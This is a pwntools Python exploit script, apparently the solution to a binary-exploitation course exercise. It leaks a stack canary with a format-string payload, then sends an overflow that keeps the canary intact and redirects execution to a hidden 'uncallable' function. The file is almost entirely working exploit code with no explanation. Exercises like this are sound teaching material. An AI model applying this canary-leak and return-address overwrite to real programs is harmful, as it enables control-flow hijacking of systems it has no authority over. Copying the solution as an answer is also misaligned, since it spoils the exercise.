#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise5/exercise5a'
#exe = './exercise5a'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# solution: 0x18: buffer + canary
#           0x10: buffer since canary 8 bytes
r = start()
e = ELF(exe)
uncall = e.symbols['uncallable']
r.sendline(b"%p."*15)
leak = r.recvuntil(b"is not the password").decode()
canary = int(leak.split('.')[6], 16)
r.sendline(b"A"*256 + p64(canary) + b"A"*16 + p64(0x40101a) + p64(uncall))
print(r.recvall())
